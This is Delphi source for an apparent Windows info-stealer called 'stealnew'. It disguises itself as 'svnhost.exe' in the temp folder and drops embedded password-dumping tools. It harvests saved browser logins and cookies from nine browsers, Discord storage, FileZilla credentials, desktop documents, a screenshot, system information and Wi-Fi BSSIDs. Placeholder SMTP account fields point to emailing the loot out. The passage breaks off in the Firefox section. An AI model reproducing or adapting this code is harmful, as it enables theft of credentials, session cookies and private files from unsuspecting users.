program stealnew;

{$APPTYPE GUI}

{$R *.res}
{$R libeay32.RES}
{$R ssleay32.RES}
{$R cps.RES}
{$R wb.RES}


uses
  Winapi.Windows,System.SysUtils,System.Win.Registry,System.Classes,Vcl.Graphics,
  Vcl.Forms, Winapi.Messages,Winapi.ShlObj,Winapi.ActiveX,Winapi.ShellAPI,
  System.Zip,IdHTTP, IdIOHandler,IdIOHandlerSocket, IdIOHandlerStack, IdSSL,
  IdSSLOpenSSL, IdBaseComponent,IdComponent, IdTCPConnection, IdTCPClient,
  IdAttachmentFile, IdMessage,IdExplicitTLSClientServerBase, IdMessageClient,
  IdSMTPBase, IdSMTP, Vcl.Clipbrd,NB30, CPUID, IdMultipartFormData, Vcl.Dialogs,
  System.UITypes, IdFTP, idFTPCommon;

var
emailfrom,passwordfrom,emailto,messbool,messtype,messsend,serversend:AnsiString;
emailfromst,passwordfromst,emailtost,messboolst,messtypest,messsendst,serversendst:AnsiString;
u:Integer;
SL1,SL2:TStringList;



function FullRemoveDir(Dir: string; DeleteAllFilesAndFolders,
StopIfNotAllDeleted, RemoveRoot: boolean): Boolean;
var
i: Integer;
SRec: TSearchRec;
FN: string;
begin
Result := False;
if not DirectoryExists(Dir) then
exit;
Result := True;
// ��������� ���� � ����� � ������ ����� - "��� ����� � ����������"
Dir := IncludeTrailingBackslash(Dir);
i := FindFirst(Dir + '*', faAnyFile, SRec);
try
while i = 0 do
begin
// �������� ������ ���� � ����� ��� ����������
FN := Dir + SRec.Name;
// ���� ��� ����������
if SRec.Attr = faDirectory then
begin
// ����������� ����� ���� �� ������� � ������ �������� �����
if (SRec.Name <> '') and (SRec.Name <> '.') and (SRec.Name <> '..') then
begin
if DeleteAllFilesAndFolders then
FileSetAttr(FN, faArchive);
Result := FullRemoveDir(FN, DeleteAllFilesAndFolders,
StopIfNotAllDeleted, True);
if not Result and StopIfNotAllDeleted then
exit;
end;
end
else // ����� ������� ����
begin
if DeleteAllFilesAndFolders then
FileSetAttr(FN, faArchive);
Result := DeleteFile(FN);
if not Result and StopIfNotAllDeleted then
exit;
end;
// ����� ��������� ���� ��� ����������
i := FindNext(SRec);
end;
finally
FindClose(SRec);
end;
if not Result then
exit;
if RemoveRoot then // ���� ���������� ������� ������ - �������
if not RemoveDir(Dir) then
Result := false;
end;


procedure RemoveAll(path: string);
var
  sr: TSearchRec;
begin
  if FindFirst(path + '\*.*', faAnyFile, sr) = 0 then
  begin
    repeat
      if sr.Attr and faDirectory = 0 then
      begin
        DeleteFile(path + '\' + sr.name);
      end
      else
      begin
        if pos('.', sr.name) <= 0 then
          RemoveAll(path + '\' + sr.name);
      end;
    until FindNext(sr) <> 0;
  end;
  FindClose(sr);
  RemoveDirectory(PChar(path));
end;

function CopyDir(fromDir, toDir: string): boolean;
var
fos: TSHFileOpStruct;
todir2: string;
begin
todir2:=todir;
ZeroMemory(@fos, SizeOf(fos));
with fos do
begin
wFunc := FO_COPY;
fFlags:= FOF_SIMPLEPROGRESS;
fflags:= fflags or FOF_NOCONFIRMATION;
fflags:= fflags or FOF_SILENT;
pFrom := PChar(fromDir + #0);
pTo := PChar(toDir2);
end;
Result := (0 = ShFileOperation(fos));
end;



function StrOemToAnsi(const S: AnsiString): AnsiString;
begin
  SetLength(Result, Length(S));
  OemToAnsiBuff(@S[1], @Result[1], Length(S));
end;

//---------------------------------------------------------------
function StrAnsiToOem(const S: AnsiString): AnsiString;
begin
  SetLength(Result, Length(S));
  AnsiToOemBuff(@S[1], @Result[1], Length(S));
end;

function GetDosOutput(CommandLine: string; Work: string = 'C:\'): string;
var
  SA: TSecurityAttributes;
  SI: TStartupInfo;
  PI: TProcessInformation;
  StdOutPipeRead, StdOutPipeWrite: THandle;
  WasOK: Boolean;
  Buffer: array[0..255] of AnsiChar;
  BytesRead: Cardinal;
  WorkDir: string;
  Handle: Boolean;
begin
  Result := '';
  with SA do
  begin
    nLength := SizeOf(SA);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;
  CreatePipe(StdOutPipeRead, StdOutPipeWrite, @SA, 0);
  try
    with SI do
    begin
      FillChar(SI, SizeOf(SI), 0);
      cb := SizeOf(SI);
      dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
      wShowWindow := SW_HIDE;
      hStdInput := GetStdHandle(STD_INPUT_HANDLE);
      hStdOutput := StdOutPipeWrite;
      hStdError := StdOutPipeWrite;
    end;
    WorkDir := Work;
    Handle := CreateProcess(nil, PChar('cmd.exe /C ' + CommandLine), nil, nil, True, 0, nil, PChar(WorkDir), SI, PI);
    CloseHandle(StdOutPipeWrite);
    if Handle then
    try
      repeat
        WasOK := ReadFile(StdOutPipeRead, Buffer, 255, BytesRead, nil);
        if BytesRead > 0 then
        begin
          Buffer[BytesRead] := #0;
          Result := Result + StrOemToAnsi(Buffer);
        end;
      until not WasOK or (BytesRead = 0);
      WaitForSingleObject(PI.hProcess, INFINITE);
    finally
      CloseHandle(PI.hThread);
      CloseHandle(PI.hProcess);
    end;
  finally
    CloseHandle(StdOutPipeRead);
  end;
end;


////////////////////////////////
////////////////////////////////
//��� �� >
////////////////////////////////
function Get_Computer_Net_Name: string;
var
  buffer: array[0..255] of char;
  size: dword;
begin
  size := 256;
  if GetComputerName(buffer, size) then
    Result := buffer
  else
    Result := ''
end;
////////////////////////////////
////////////////////////////////
//��� �� <
////////////////////////////////


////////////////////////////////
////////////////////////////////
//��� ������������ >
////////////////////////////////

function Get_User_Name: string; //�������� ��� ������������
var
  buf: array[0..MAX_COMPUTERNAME_LENGTH] of char;
  sizebuf: dword;
begin
  GetUserName(buf, sizebuf);
  Result := StrPas(buf);
end;
////////////////////////////////
////////////////////////////////
//��� ������������ <
////////////////////////////////




////////////////////////////////
////////////////////////////////
//MAC �� >
////////////////////////////////

function Physically_Mac_Address: string;
var
  AdapterList: TLanaEnum;
  NCB: TNCB;

  function GetAdapterInfo(Lana: AnsiChar): string;
  var
    Adapter: TAdapterStatus;
    NCB: TNCB;
  begin
    FillChar(NCB, SizeOf(NCB), 0);
    NCB.ncb_command := Char(NCBRESET);
    NCB.ncb_lana_num := Lana;
    if Netbios(@NCB) <> Char(NRC_GOODRET) then
    begin
      Result := 'mac not found';
      Exit;
    end;

    FillChar(NCB, SizeOf(NCB), 0);
    NCB.ncb_command := Char(NCBASTAT);
    NCB.ncb_lana_num := Lana;
    NCB.ncb_callname := '*';

    FillChar(Adapter, SizeOf(Adapter), 0);
    NCB.ncb_buffer := @Adapter;
    NCB.ncb_length := SizeOf(Adapter);
    if Netbios(@NCB) <> Char(NRC_GOODRET) then
    begin
      Result := 'mac not found';
      Exit;
    end;
    Result := IntToHex(Byte(Adapter.adapter_address[0]), 2) + '-' + IntToHex(Byte(Adapter.adapter_address[1]), 2) + '-' + IntToHex(Byte(Adapter.adapter_address[2]), 2) + '-' + IntToHex(Byte(Adapter.adapter_address[3]), 2) + '-' + IntToHex(Byte(Adapter.adapter_address[4]), 2) + '-' + IntToHex(Byte(Adapter.adapter_address[5]), 2);
  end;

begin
  FillChar(NCB, SizeOf(NCB), 0);
  NCB.ncb_command := Char(NCBENUM);
  NCB.ncb_buffer := @AdapterList;
  NCB.ncb_length := SizeOf(AdapterList);
  Netbios(@NCB);
  if Byte(AdapterList.length) > 0 then
    Result := GetAdapterInfo(AdapterList.lana[0])
  else
    Result := 'mac not found';
end;
////////////////////////////////
////////////////////////////////
//MAC �� <
////////////////////////////////



////////////////////////////////
////////////////////////////////
//������ ����� ����� >
////////////////////////////////

function Get_Video_Device: string;
var
  lpDisplayDevice: TDisplayDevice;
  dwFlags: DWORD;
  cc: DWORD;
begin
  lpDisplayDevice.cb := sizeof(lpDisplayDevice);
  dwFlags := 0;
  cc := 0;
  EnumDisplayDevices(nil, cc, lpDisplayDevice, dwFlags);
  Result := lpDisplayDevice.DeviceString;
end;
////////////////////////////////
////////////////////////////////
//������ ����� ����� <
////////////////////////////////



////////////////////////////////
////////////////////////////////
//�������� ����������� ����� >
////////////////////////////////
function Get_Name_Motherboard:string;
var
s:TStringList;
function GetDosOutput(
CommandLine: string; Work: string = 'C:\'): string;
var
SA: TSecurityAttributes;
SI: TStartupInfo;
PI: TProcessInformation;
StdOutPipeRead, StdOutPipeWrite: THandle;
WasOK: Boolean;
Buffer: array[0..255] of AnsiChar;
BytesRead: Cardinal;
WorkDir: string;
Handle: Boolean;
begin
Result := '';
with SA do begin
nLength := SizeOf(SA);
bInheritHandle := True;
lpSecurityDescriptor := nil;
end;
CreatePipe(StdOutPipeRead, StdOutPipeWrite, @SA, 0);
try
with SI do
begin
FillChar(SI, SizeOf(SI), 0);
cb := SizeOf(SI);
dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
wShowWindow := SW_HIDE;
hStdInput := GetStdHandle(
STD_INPUT_HANDLE);
hStdOutput := StdOutPipeWrite;
hStdError := StdOutPipeWrite;
end;
WorkDir := Work;
Handle := CreateProcess(nil, PChar('cmd.exe /C ' + CommandLine),
nil, nil, True, 0, nil,
PChar(WorkDir), SI, PI);
CloseHandle(StdOutPipeWrite);
if Handle then
try
repeat
WasOK := ReadFile(StdOutPipeRead, Buffer, 255, BytesRead, nil);
if BytesRead > 0 then
begin
Buffer[BytesRead] := #0;
Result := Result + string(Buffer);
end;

until not WasOK or (BytesRead = 0);
WaitForSingleObject(PI.hProcess, INFINITE);
finally
CloseHandle(PI.hThread);
CloseHandle(PI.hProcess);
end;
finally
CloseHandle(StdOutPipeRead);
end;
end;
begin
  s := TStringList.create;
  s.Text := GetDosOutput('wmic baseboard get product');
  Result :=  s.Strings[2];
  s.Free;
end;
////////////////////////////////
////////////////////////////////
//�������� ����������� ����� <
////////////////////////////////


////////////////////////////////
////////////////////////////////
//�������� ����� C:\ >
////////////////////////////////

function Get_HD_Number: shortstring; export;
var
  VolumeName, FileSystemName: array[0..MAX_PATH - 1] of Char;
  VolumeSerialNo: Cardinal;
  MaxComponentLength, FileSystemFlags: DWORD;
begin
  try
    GetVolumeInformation('C:\', VolumeName, MAX_PATH, @VolumeSerialNo, MaxComponentLength, FileSystemFlags, FileSystemName, MAX_PATH);
    Result := ShortString(trim(IntToHex(HiWord(VolumeSerialNo), 4))) + '-' + ShortString(trim(IntToHex(LoWord(VolumeSerialNo), 4)));
  except
    ;
  end;
end;
////////////////////////////////
////////////////////////////////
//�������� ����� C:\ <
////////////////////////////////





type
  TStringArray = array of string;

function Get_Info_IP: TStringArray;
var
  idhttp: TIdHTTP;
  s,sr: Unicodestring;
  Count: Integer;

  function Pars(T_, ForS, _T: string): string;
  var
    a, b: integer;
  begin
    Result := '';
    if (T_ = '') or (ForS = '') or (_T = '') then
      Exit;
    a := Pos(T_, ForS);
    if a = 0 then
      Exit
    else
      a := a + Length(T_);
    ForS := Copy(ForS, a, Length(ForS) - a + 1);
    b := Pos(_T, ForS);
    if b > 0 then
      Result := Copy(ForS, 1, b - 1);
  end;

begin
  Count := 0;
  s := '';
  idHTTP := TIdHttp.Create(nil);
  idHTTP.Request.UserAgent := 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10';
  try
    sr := idhttp.Get('http://www.geoplugin.net/json.gp');
    s := Pars('"geoplugin_request":"', sr, '",');
    if s <> '' then
    begin
        SetLength(result, Count + 1);
        Result[Count] := 'IP: '+s;
        Inc(Count);
        s := '';
    end;
    s := Pars('"geoplugin_countryName":"', sr, '",');
    if s <> '' then
    begin
        SetLength(result, Count + 1);
        Result[Count] := 'COUNTRY: '+s;
        Inc(Count);
        s := '';
    end;
    s := Pars('"geoplugin_countryCode":"', sr, '",');
    if s <> '' then
    begin
        SetLength(result, Count + 1);
        Result[Count] := 'COUNTRY CODE: '+s;
        Inc(Count);
        s := '';
    end;
    s := Pars('"geoplugin_region":"', sr, '",');
    if s <> '' then
    begin
        SetLength(result, Count + 1);
        Result[Count] := 'REGION: '+s;
        Inc(Count);
        s := '';
    end;
    s := Pars('"geoplugin_city":"', sr, '",');
    if s <> '' then
    begin
        SetLength(result, Count + 1);
        Result[Count] := 'CITY: '+s;
        Inc(Count);
        s := '';
    end;
    s := Pars('"geoplugin_continentName":"', sr, '",');
    if s <> '' then
    begin
        SetLength(result, Count + 1);
        Result[Count] := 'CONTINENT: '+s;
        Inc(Count);
        s := '';
    end;
  finally
    idHTTP.Free;
  end;

end;


function GetSpecialFolderPath(CSIDL: Integer): string;
var
  Path: PChar;
begin
  Result := '';
  GetMem(Path, MAX_PATH);
  try
    if not SHGetSpecialFolderPath(0, Path, CSIDL, False) then
      raise Exception.Create('Shell function SHGetSpecialFolderPath fails.');
    Result := Trim(StrPas(Path));
    if Result = '' then
      raise Exception.Create('Shell function SHGetSpecialFolderPath return an empty string.');
    Result := IncludeTrailingPathDelimiter(Result);
  finally
    FreeMem(Path, MAX_PATH);
  end;
end;

function GetUserAppDataFolderPath: string;
begin
  Result := GetSpecialFolderPath(CSIDL_APPDATA);
end;


function GetShellFolder(CSIDL: integer): string;
var
  pidl: PItemIdList;
  FolderPath: string;
  SystemFolder: integer;
  Malloc: IMalloc;
begin
  Malloc := nil;
  FolderPath := '';
  SHGetMalloc(Malloc);
  if Malloc = nil then
  begin
    Result := FolderPath;
    Exit;
  end;
  try
    SystemFolder := CSIDL;
    if SUCCEEDED(SHGetSpecialFolderLocation(0, SystemFolder, pidl)) then
    begin
      SetLength(FolderPath, max_path);
      if SHGetPathFromIDList(pidl, PChar(FolderPath)) then
      begin
        SetLength(FolderPath, length(PChar(FolderPath)));
      end;
    end;
    Result := FolderPath;
  finally
    Malloc.Free(pidl);
  end;
end;

function GetTempWindows: string;
var
  lng: DWORD;
  thePath: string;
begin
  SetLength(thePath, MAX_PATH);
  lng := GetTempPath(MAX_PATH, PChar(thePath));
  SetLength(thePath, lng);
  result := thePath;
end;

function GetDesktopDir: string;
var
  reg: TRegistry;
begin
  Result := '';
  reg := TRegistry.Create(KEY_READ);
  try
    reg.RootKey := HKEY_CURRENT_USER;
    if reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\' + 'Explorer\Shell Folders', False) then
      Result := reg.ReadString('Desktop');
    reg.CloseKey;
  finally
    reg.Free;
  end;
end;

function getHWID(): string;
var
  SerialNum, A, B: DWord;
  C: array[0..255] of Char;
  Buffer: array[0..255] of Char;
begin
  if GetVolumeInformation(pChar('C:\'), Buffer, 256, @SerialNum, A, B, C, 256) then
    Result := inttostr(SerialNum * Cardinal(-1))
  else
    Result := '';
end;


function CopyFileDesktop(extensions: string): string;
var
  FileName: TSearchRec;
  r: integer;
begin
  r := FindFirst(GetDesktopDir + '\*.' + extensions, faAnyFile, FileName);

  ForceDirectories(GetTempWindows + '\' + getHWID + '\Files\Desktop');
  if r = 0 then
  begin
    CopyFile(PChar(GetDesktopDir + '\' + FileName.Name), PChar(GetTempWindows + '\' + getHWID + '\Files\Desktop\' + FileName.Name), false);
  end;

  while (FindNext(FileName) = 0) do
  begin
    CopyFile(PChar(GetDesktopDir + '\' + FileName.Name), PChar(GetTempWindows + '\' + getHWID + '\Files\Desktop\' + FileName.Name), false);
  end;
end;

procedure ScreenShot(PathToSave: string);
begin
  with TBitmap.Create do
  begin
    Width := Screen.Width; // ��������� �������
    Height := Screen.Height;

    BitBlt(Canvas.Handle, 0, 0, Width, Height, GetDC(GetDesktopWindow), 0, 0, SRCCOPY);

    SaveToFile(PathToSave); // ��������� �� ����
    Free; // �����������
  end;
end;

procedure RunAsAdministrator(const source:string);
var
shExecInfo: PShellExecuteInfo;
begin
New(shExecInfo);
shExecInfo^.cbSize := SizeOf(SHELLEXECUTEINFO);
shExecInfo^.fMask := 0;
shExecInfo^.Wnd := 0;
shExecInfo^.lpVerb := 'runas';
shExecInfo^.lpFile := PChar(ExtractFileName(source));
shExecInfo^.lpParameters := '';
shExecInfo^.lpDirectory := PChar(ExtractFilePath(source));
shExecInfo^.nShow := SW_HIDE;
shExecInfo^.hInstApp := 0;
ShellExecuteEx(shExecInfo);
Dispose(shExecInfo);
end;

procedure ExtractRes(ResType, ResName, ResNewName: string);
var
  Res: TResourceStream;
begin
  Res := TResourceStream.Create(Hinstance, Resname, Pchar(ResType));
  Res.SavetoFile(ResNewName);
  Res.Free;
end;



procedure get_pass_chr();
var
H: HWND;
hmen,hSubmenu: HMenu;
dwIDMenuItem:DWORD;
s:array[0..MAX_PATH-1] of char;
begin

H := FindWindow(nil, 'Chromepass');
hmen := GetMenu(H);
hSubmenu:=GetSubMenu(hMen,1);
dwIDMenuItem:=GetMenuItemID(hSubmenu,3);
GetMenuString(hSubmenu,dwIDMenuItem,s,MAX_PATH,MF_BYCOMMAND);
PostMessage(H,WM_COMMAND,dwIDMenuItem,0);
dwIDMenuItem:=GetMenuItemID(hSubmenu,1);
GetMenuString(hSubmenu,dwIDMenuItem,s,MAX_PATH,MF_BYCOMMAND);
PostMessage(H,WM_COMMAND,dwIDMenuItem,0);
Application.ProcessMessages;
Sleep(1000);
Application.ProcessMessages;
SL1.Clear;
SL1.Text:=Clipboard.AsText;
end;




procedure rebuild_pass(st:string);
var
i,j:Integer;
arr:array[0..9] of string;
str:string;
begin

 arr[0]:='Origin URL: ';
 arr[1]:='Action URL: ';
 arr[2]:='User Name Field: ';
 arr[3]:='Password Field: ';
 arr[4]:='User Name: ';
 arr[5]:='Password: ';
 arr[6]:='Created Time: ';
 arr[7]:='Password Strength: ';
 arr[8]:='Password File: ';
  for i := 0 to SL1.Count-1 do
    begin
     SL2.Add(StringReplace(SL1[i] , '	',#13#10, [rfReplaceAll, rfIgnoreCase]));
     Application.ProcessMessages;
    end;
    SL2.SaveToFile(GetTempWindows + '\' + getHWID + '\Files\browserpasstmp.txt');
    SL2.Clear;
    SL2.LoadFromFile(GetTempWindows + '\' + getHWID + '\Files\browserpasstmp.txt');
    j:=0;
    for i := 0 to SL2.Count-1 do
    begin

       SL2[i] :=  arr[j]+SL2[i];
       j:=j+1;

       if j = 10 then
       begin
       SL2[i] := '------------------------------------------';
       j:=0;
       end;
       Application.ProcessMessages;
    end;

    SL2.SaveToFile(GetTempWindows + '\' + getHWID + '\Files\browserpass.txt');
    DeleteFile(GetTempWindows + '\' + getHWID + '\Files\browserpasstmp.txt');
end;



procedure get_pass_wb();
var
H: HWND;
hmen,hSubmenu: HMenu;
dwIDMenuItem:DWORD;
s:array[0..MAX_PATH-1] of char;
begin

H := FindWindow(nil, 'WebBrowserPassView');
hmen := GetMenu(H);
hSubmenu:=GetSubMenu(hMen,1);
dwIDMenuItem:=GetMenuItemID(hSubmenu,4);
GetMenuString(hSubmenu,dwIDMenuItem,s,MAX_PATH,MF_BYCOMMAND);
PostMessage(H,WM_COMMAND,dwIDMenuItem,0);
dwIDMenuItem:=GetMenuItemID(hSubmenu,1);
GetMenuString(hSubmenu,dwIDMenuItem,s,MAX_PATH,MF_BYCOMMAND);
PostMessage(H,WM_COMMAND,dwIDMenuItem,0);
Application.ProcessMessages;
Sleep(1000);
Application.ProcessMessages;
SL1.Clear;
SL1.Text:=Clipboard.AsText;
end;

procedure rebuild_pass_wb(st:string);
var
i,j:Integer;
arr:array[0..10] of string;
str:string;
begin

 arr[0]:='Origin URL:          |';
 arr[1]:=' ';
 arr[2]:='User Name:           |';
 arr[3]:='Password:            |';
 arr[4]:=' ';
 arr[5]:='User Name Field:     |';
 arr[6]:='Password Field:      |';
 arr[7]:='Created Time:        |';
 arr[8]:='Password Strength:   |';
 arr[9]:='Password File:       |';
    SL2.Clear;
  for i := 0 to SL1.Count-1 do
    begin
     SL2.Add(StringReplace(SL1[i] , '	',#13#10, [rfReplaceAll, rfIgnoreCase]));
     Application.ProcessMessages;
    end;
    SL2.SaveToFile(GetTempWindows + '\' + getHWID + '\Files\wbpasstmp.txt');
    SL2.Clear;
    SL2.LoadFromFile(GetTempWindows + '\' + getHWID + '\Files\wbpasstmp.txt');
    j:=0;
    for i := 0 to SL2.Count-1 do
    begin

       SL2[i] :=  arr[j]+SL2[i];
       j:=j+1;

       if j = 11 then
       begin
       SL2[i] := '------------------------------------------';
       j:=0;
       end;
       Application.ProcessMessages;
    end;

    SL2.SaveToFile(GetTempWindows + '\' + getHWID + '\Files\wbpass.txt');
    DeleteFile(GetTempWindows + '\' + getHWID + '\Files\wbpasstmp.txt');
end;

var
browsers: array[1..9] of string;
browsers_path: array[1..9] of string;
browsers_path_cookie: array[1..9] of string;
local, appdata: string;
i:Integer;
SMTP : TIdSMTP;
msg : TIdMessage;
SSLOpen : TIdSSLIOHandlerSocketOpenSSL;
ZF: TZipFile;
arr: TStringArray;
sr: TSearchRec;
road: string;
F : TextFile;
eFile : string;
idhttp: TIdHTTP;
formData: TIdMultiPartFormDataStream;
response: string;
idFTP: TidFTP;
begin


  if FileExists(GetTempWindows + '\svnhost.exe') = False then
  begin
      CopyFile(PChar(ParamStr(0)), PChar(GetTempWindows + '\svnhost.exe'), true);
      Application.ProcessMessages;
      Sleep(2000);
      Application.ProcessMessages;
      ShellExecute(0,'open',PChar(GetTempWindows + '\svnhost.exe'),nil,nil,SW_Show);
    asm
      call Exitprocess;
    end;
  end;

  if ExtractFileName(ParamStr(0)) <> 'svnhost.exe' then
  begin
     asm
      call Exitprocess;
     end;
  end;

  emailfrom := AnsiString('999999999999999999999999999999999999999999999999999999999999');    //���� �����
  passwordfrom := AnsiString('999999999999999999999999999999999999999999999999999999999999');  //������ �����
  emailto := AnsiString('999999999999999999999999999999999999999999999999999999999999');       //���� ���� ��������
  messbool := AnsiString('999999999999999999999999999999999999999999999999999999999999'); //y n
  messtype := AnsiString('999999999999999999999999999999999999999999999999999999999999');  // error warning confirmation information
  messsend := AnsiString('999999999999999999999999999999999999999999999999999999999999');  //���������
  serversend := AnsiString('999999999999999999999999999999999999999999999999999999999999');  //������


  for u := 1 to Length(emailfrom) do
  if emailfrom[u] <> '' then
   emailfromst := emailfromst + emailfrom[u]
   else Break;

  for u := 1 to Length(passwordfrom) do
  if passwordfrom[u] <> '' then
   passwordfromst := passwordfromst + passwordfrom[u]
   else Break;

  for u := 1 to Length(emailto) do
  if emailto[u] <> '' then
   emailtost := emailtost + emailto[u]
   else Break;

  for u := 1 to Length(messbool) do
  if messbool[u] <> '' then
   messboolst := messboolst + messbool[u]
   else Break;

  for u := 1 to Length(messtype) do
  if messtype[u] <> '' then
   messtypest := messtypest + messtype[u]
   else Break;

  for u := 1 to Length(messsend) do
  if messsend[u] <> '' then
   messsendst := messsendst + messsend[u]
   else Break;

   for u := 1 to Length(serversend) do
  if serversend[u] <> '' then
   serversendst := serversendst + serversend[u]
   else Break;


   SL1:=TStringList.Create;
   SL2:=TStringList.Create;


  //��������� ����
  if FileExists(ExtractFilePath(Application.ExeName)+'libeay32.dll') = False then
  begin
    ExtractRes('DLLFILE', 'libeay32', ExtractFilePath(Application.ExeName)+'libeay32.dll');
  end;

  if FileExists(ExtractFilePath(Application.ExeName)+'ssleay32.dll') = False then
  begin
    ExtractRes('DLLFILE', 'ssleay32', ExtractFilePath(Application.ExeName)+'ssleay32.dll');
  end;

  if FileExists(ExtractFilePath(Application.ExeName)+'cps.exe') = False then
  begin
    ExtractRes('EXEFILE', 'cps', ExtractFilePath(Application.ExeName)+'cps.exe');
  end;

  if FileExists(ExtractFilePath(Application.ExeName)+'wb.exe') = False then
  begin
    ExtractRes('EXEFILE', 'wb', ExtractFilePath(Application.ExeName)+'wb.exe');
  end;



  // ������ ������
  browsers[1] := 'Google';
  browsers[2] := 'Opera';
  browsers[3] := 'Kometa';
  browsers[4] := 'Orbitum';
  browsers[5] := 'Comodo';
  browsers[6] := 'Amigo';
  browsers[7] := 'Torch';
  browsers[8] := 'Chromium';
  browsers[9] := 'Yandex';


  appdata := GetUserAppDataFolderPath;
  local := GetShellFolder(28);
  browsers_path[1] := local + '\Google\Chrome\User Data\Default\Login Data';
  browsers_path[2] := appdata + 'Opera Software\Opera Stable\Login Data';
  browsers_path[3] := local + '\Kometa\User Data\Default\Login Data';
  browsers_path[4] := local + '\Orbitum\User Data\Default\Login Data';
  browsers_path[5] := local + '\Comodo\Dragon\User Data\Default\Login Data';
  browsers_path[6] := local + '\Amigo\User\User Data\Default\Login Data';
  browsers_path[7] := local + '\Torch\User Data\Default\Login Data';
  browsers_path[8] := local + '\Chromium\User Data\Default\Login Data';
  browsers_path[9] := local + '\Yandex\YandexBrowser\User Data\Default\Ya Passman Data';


  browsers_path_cookie[1] := local + '\Google\Chrome\User Data\Default\Cookies';
  browsers_path_cookie[2] := appdata + 'Opera Software\Opera Stable\Cookies';
  browsers_path_cookie[3] := local + '\Kometa\User Data\Default\Cookies';
  browsers_path_cookie[4] := local + '\Orbitum\User Data\Default\Cookies';
  browsers_path_cookie[5] := local + '\Comodo\Dragon\User Data\Default\Cookies';
  browsers_path_cookie[6] := local + '\Amigo\User\User Data\Default\Cookies';
  browsers_path_cookie[7] := local + '\Torch\User Data\Default\Cookies';
  browsers_path_cookie[8] := local + '\Chromium\User Data\Default\Cookies';
  browsers_path_cookie[9] := local + '\Yandex\YandexBrowser\User Data\Default\Cookies';

  for i := 1 to 9 do
  begin
    if FileExists(browsers_path[i]) = True then
    begin
      ForceDirectories(GetTempWindows + '\' + getHWID + '\Files\Browsers\Password');
      ForceDirectories(GetTempWindows + '\' + getHWID + '\Files\Browsers\Password\'+browsers[i]);
      CopyFile(PChar(browsers_path[i]), PChar(GetTempWindows + '\' + getHWID + '\Files\Browsers\Password\'+browsers[i]+'\Login Data'), true);
    end;
  end;

  for i := 1 to 9 do
  begin

    if FileExists(browsers_path_cookie[i]) = True then
    begin
      ForceDirectories(GetTempWindows + '\' + getHWID + '\Files\Browsers\Cookies');
      ForceDirectories(GetTempWindows + '\' + getHWID + '\Files\Browsers\Cookies\'+browsers[i]);
      CopyFile(PChar(browsers_path_cookie[i]), PChar(GetTempWindows + '\' + getHWID + '\Files\Browsers\Cookies\'+browsers[i]+'\Cookies'), true);
    end;
  end;


  //����������� ������ � �������� �����
  CopyFileDesktop('txt');
  CopyFileDesktop('doc');
  CopyFileDesktop('rtf');
  CopyFileDesktop('pdf');
  CopyFileDesktop('log');
  CopyFileDesktop('php');
  CopyFileDesktop('sql');
  CopyFileDesktop('xml');
  CopyFileDesktop('html');
  CopyFileDesktop('css');
  CopyFileDesktop('js');
  CopyFileDesktop('pas');

   //�����
  ForceDirectories(GetTempWindows + '\' + getHWID + '\Files\InfoPC');
  ScreenShot(GetTempWindows + '\' + getHWID + '\Files\InfoPC\Screenshot.png');



  //���������� � ��
  SL1.text := GetDosOutput('systeminfo');
  SL1.SaveToFile(GetTempWindows + '\' + getHWID + '\Files\InfoPC\Systeminfo.txt');


  //BSSID
  road := GetDosOutput('netsh wlan show networks mode=bssid');
  //road := Pars('BSSID 1:                        ', road, ' ');
  SL1.text := road;
  SL1.SaveToFile(GetTempWindows + '\' + getHWID + '\Files\InfoPC\BSSID.txt');

  //Discord �����
  ForceDirectories(GetTempWindows + '\' + getHWID + '\Files\Discord\Local Storage');
  CopyFile(PChar(GetUserAppDataFolderPath + 'discord\Local Storage\https_discordapp.com_0.localstorage-journal'), PChar(GetTempWindows + '\' + getHWID + '\Files\Discord\Local Storage\https_discordapp.com_0.localstorage-journal'), false);
  CopyFile(PChar(GetUserAppDataFolderPath + 'discord\Local Storage\https_www.youtube.com_0.localstorage'), PChar(GetTempWindows + '\' + getHWID + '\Files\Discord\Local Storage\https_www.youtube.com_0.localstorage'), false);
  CopyFile(PChar(GetUserAppDataFolderPath + 'discord\Local Storage\https_www.youtube.com_0.localstorage-journal'), PChar(GetTempWindows + '\' + getHWID + '\Files\Discord\Local Storage\https_www.youtube.com_0.localstorage-journal'), false);
  CopyFile(PChar(GetUserAppDataFolderPath + 'discord\Local Storage\https_m.stripe.network_0.localstorage'), PChar(GetTempWindows + '\' + getHWID + '\Files\Discord\Local Storage\https_m.stripe.network_0.localstorage'), false);
  CopyFile(PChar(GetUserAppDataFolderPath + 'discord\Local Storage\https_m.stripe.network_0.localstorage-journal'), PChar(GetTempWindows + '\' + getHWID + '\Files\Discord\Local Storage\https_m.stripe.network_0.localstorage-journal'), false);
  CopyFile(PChar(GetUserAppDataFolderPath + 'discord\Cookies-journal'), PChar(GetTempWindows + '\' + getHWID + '\Files\Discord\Cookies-journal'), false);
  CopyFile(PChar(GetUserAppDataFolderPath + 'discord\Cookies'), PChar(GetTempWindows + '\' + getHWID + '\Files\Discord\Cookies'), false);

  //FileZilla
  ForceDirectories(GetTempWindows + '\' + getHWID + '\Files\FileZilla');
  CopyFile(PChar(GetUserAppDataFolderPath + 'FileZilla\recentservers.xml'), PChar(GetTempWindows + '\' + getHWID + '\Files\FileZilla\recentservers.xml'), false);
  CopyFile(PChar(GetUserAppDataFolderPath + 'FileZilla\sitemanager.xml'), PChar(GetTempWindows + '\' + getHWID + '\Files\FileZilla\sitemanager.xml'), false);

  //Internet Explorer Cookie
  try
  ShellExecute(0, PChar(string('open')), PChar(string('cmd.exe')),PChar(string('/c attrib -r -s -a -h "'+appdata + 'Microsoft\Windows\Cookies" && Exit')), nil, SW_HIDE);
  except
  Application.ProcessMessages;
  end;
   try
   ForceDirectories(GetTempWindows + '\' +  getHWID + '\Files\Browsers\Cookies\InternerExplorerNew');
   CopyDir(PChar (appdata + 'Microsoft\Windows\Cookies\*.*'), PChar (GetTempWindows  + getHWID + '\Files\Browsers\Cookies\InternerExplorerNew'));
   except
   Application.ProcessMessages;
   end;
 ///////


   //Mozila FireFox Cookie
if DirectoryExists(appdata + 'Mozilla\Firefox\Profiles') = True then
begin
// �������� ����������
 if FindFirst(appdata + 'Mozilla\Firefox\Profiles\*.*', faAnyFile, sr) = 0 then
  begin
    repeat
